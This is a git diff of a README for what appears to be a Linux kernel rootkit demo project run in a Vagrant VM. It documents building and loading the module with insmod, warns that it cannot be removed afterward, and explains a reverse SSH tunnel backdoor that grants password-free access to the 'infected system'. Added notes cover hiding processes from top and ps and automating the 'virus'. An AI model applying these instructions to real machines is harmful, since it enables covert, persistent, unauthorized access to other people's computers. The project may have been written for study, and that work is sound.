@@ -17,7 +17,7 @@ Some commands are accessible by using the system call `kill(pid_t pid, int, sig)
 ## Building Instructions
 
 ### <u>Backdoor Configuration Instructions</u>
-Some set up is needed on the computer you wish to use to access the comprimised machine remotely, and without the need for their password.
+Some set up is needed on the computer you wish to use to access the comprimised machine remotely, and without the need for their password. It is highly recomended that you use a Linux based machine to access the comprimised computer, as our method is not verified on Windows or MacOS.
 
 ***Turn on SSH port forwarding***
 
@@ -53,7 +53,7 @@ In order to showcase our rootkit, we will be using a Vagrant VM running Ubuntu 1
 3. `vagrant ssh` 
 
 ### <u>Clean Build Instructions Once in Vagrant</u>
-1. ``` sudo apt-get install linux-headers-`uname -r` ``` **WE CAN AUTOMATE THIS STEP IN THE INIT FUNCTION OF ROOTKIT**
+1. ``` sudo apt-get install linux-headers-`uname -r` ```
 2. `cd /vagrant` to go to shared 'guest' folder
 3. `make all`
 4. `sudo insmod rootkit.ko`
@@ -74,3 +74,9 @@ Warning: there is no way to remove the rootkit after this - if you want to recom
 2. We have set up a reverse ssh tunnel, meaning that whenever our router sees we are sending a request to `localhost` on port `7000` it will divert this to port `22` of our infected system
 3. To access the infected system, simply type the command `ssh targetUser@localhost -p 7000` and you will have access to their system without the need for their password
 
+### <u>Showing Rootkit features<\u>
+1. Different commands of virus
+2. How to change code to make it automated
+
+
+small programs cant be seen in `top` as dont use enough cpu. can see hiding processes though using `ps`. Execute `sleep 120 &` for demo program as payload doesnt run long enough
